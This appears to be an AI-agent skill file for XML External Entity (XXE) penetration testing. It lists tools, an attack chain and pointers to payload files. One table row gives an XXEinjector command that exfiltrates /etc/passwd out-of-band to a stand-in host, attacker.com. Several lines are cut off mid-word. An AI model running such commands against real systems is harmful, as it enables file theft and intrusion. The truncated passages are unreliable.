---
name: chiper-web-xxe
description: "Use when XML External Entity (XXE) injection exploits vulnerable XML parsers to read local files, initiate SSRF attacks, exfiltrate data through out-of-band channels, and cause den"
version: "0.2.0"
author: Chiper (Chiper-Cyber)
metadata:
  Chiper:
    tags: [pentest, security, kali-linux, chiper-cyber, web, xxe]
references:
  - path: ~/.Chiper/skills/chiper-cyber/chiper-web-xxe/SKILL.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-web-xxe/payloads.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-web-xxe/test-cases.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-web-xxe/guides
---

# Web Xxe

## Prerequisites

> 💡 Missing tools? This skill will auto-check before execution.

**Required tools:**

- `netcat` — install: `sudo apt install -y netcat-traditional`

**Quick check (run before using this skill):**

```bash
# Check which tools are missing
MISSING=""
for cmd in netcat; do
  command -v "$cmd" >/dev/null 2>&1 || MISSING="$MISSING $cmd"
done
if [ -n "$MISSING" ]; then
  echo "⚠️  Missing tools:$MISSING"
  echo "Install with:"
  command -v netcat >/dev/null 2>&1 || echo "  sudo apt install -y netcat-traditional"
else
  echo "✅ All tools installed"
fi
```

## When to Use

Web Xxe skill domain covering web attack operations.

**Tools**: XXEinjector, oxml_xxe, xxeplus, Burp Suite, odat, netcat

**Domain**: web-attack

**OWASP**: A05:2021-Security Misconfiguration

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **XXEinjector** | Automated XXE exploitation with OOB exfiltration, supports blind XXE via DNS/HTTP/FTP channels | `ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --oob=http --verbose` |
| **oxml_xxe** | Weaponiz

## Methodology Overview

### Attack Chain

```
[1] Endpoint Discovery     [2] Basic XXE Test       [3] Escalation
    - SOAP / REST APIs         - Classic file read       - Blind XXE (OOB)
    - File uploads (XML)       - /etc/passwd proof       - Error-based XXE
    - SVG / DOCX parsing       - Entity injection        - XXE to SSRF
    - Content-Type fuzz             |                    - Parameter entities
            

## Instructions

Read the referenced chiper-cyber files for full methodology:
- **SKILL.md** — Step-by-step methodology, attack chain, tools, and defense perspective
- **payloads.md** — Ready-to-use attack payloads organized by type and technique
- **test-cases.md** — Structured test procedures with prerequisites and expected results
- **guides/** — Deep-dive learning materials and scripts

Full skill content at: `~/.Chiper/skills/chiper-cyber/chiper-web-xxe/`

## Examples

See `payloads.md` in the referenced directory for ready-to-use attack payloads.

## Test Cases

See `test-cases.md` in the referenced directory for structured test procedures.

## Notes

- Source: Chiper-Cyber v1.0.0 — Security Skills Ecosystem (Chiper 2026)
- Defense Triple: Defense Perspective + Detection Methods + Evasion Techniques
- Update: `cd ~/.Chiper/skills/chiper-cyber && git pull`
